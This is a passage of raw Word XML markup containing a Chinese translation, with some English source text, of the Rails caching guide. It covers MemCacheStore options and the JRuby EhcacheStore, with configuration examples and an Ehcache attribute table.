          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to send a value directly to the server with no serialization. The value must be a string or number. You can use memcached direct operation like </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>increment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>decrement</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> only on raw values. You can also specify </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless_exist</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> if you don’t want memcached to overwrite an existing entry.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642CA7E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该缓存存储中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>write</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fetch</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法接受两个额外的选项来使用 memcached 。可以指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:raw</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来把无序列的值直接传递到服务。该值可以是一个字符串或数值。可以使用 memcached 直接的操作，例如对原始（ raw ）值使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>increment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>decrement</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。如果不希望 memcached 重写已经存在的内容，可以指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless_exist</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>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5C9DC264" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2032EC3E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1152254290"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ActionController::Base.cache_store = :mem_cache_store, "cache-1.example.com", "cache-2.example.com"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B375530"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2.6 ActiveSupport::Cache::EhcacheStore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CBEAA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如果你使用 JRuby ，你可以使用 Terracotta 的 Ehcache 作为你应用程序的缓存存储方式。 Ehcache 是开源的 Java 缓存，它也提供具有增加的可扩展性，管理和商业支持的企业版本。使用此缓存存储，需要先安装 jruby-ehcache-rails3 gem 包（版本为1.1.0 及之后的版本）。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="594D6206" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DF4F450" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1039431952"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>ActionController::Base.cache_store = :ehcache_store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="08B66C8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在初始化缓存时，你可能使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:ehcache_config</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定 Ehcache 使用的配置文件（默认为 Rails 项目 config 目录下的“echcache.xml“），:cache_name 选项为缓存提供一个自定义名称（默认的名称为 rails_cache ）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596E438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除了标准的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:expires_in</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项外，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>write</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法在该缓存中也接收额外的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless_exist</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项，它可以使缓存存储使用 Ehcache 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>putIfAbsent</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来代替 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>put</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，因此将不会重写已经存在的缓存内容。另外， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>write</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法提供所有的属性，通过 </w:t>
      </w:r>
      <w:hyperlink r:id="rId929" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ehcache Element class</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，包括：</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8"/>
        <w:gridCol w:w="2340"/>
        <w:gridCol w:w="3278"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="275C6566" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="762216CA" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">属性 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14D147C9" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">参数类型 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BBB9BFF" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">描述 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="150ACD74" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EAAB2C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elementEvictionData </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1599430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ElementEvictionData </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33AD290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设置元素的 eviction 数据实例。 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1BC6AA2F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A78968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eternal </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F34C75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boolean </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="06D1055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设置元素是否是永久的。 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2B543C38" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F7B7CC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timeToIdle, tti </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F6FB95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int </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C26E60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设置空闲时间 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="14C6163A" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5996EC8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timeToLive, ttl, expires_in </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DFC31F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int </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F15721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设置活跃时间 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="51B906B6" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E4F61F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version </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="166D679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long </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E2AF9A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设置 ElementAttributes 对象的版本属性。 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42435C0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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2EE95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这些选项以 Hash 选项传递到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>write</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，使用驼峰命名法或下划线表示法，下面是一个例子：</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5CE2B016" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7BBB66A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Rails.cache.write('key', 'value', :time_to_idle</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 60.seconds, :timeToLive</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 600.seconds)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F5F0F8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caches_action :index, :expires_in</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 60.seconds, :unless_exist</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F8A2F3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更多关于 Ehcache 的信息，请查看 </w:t>
      </w:r>
      <w:hyperlink r:id="rId930" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://ehcache.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
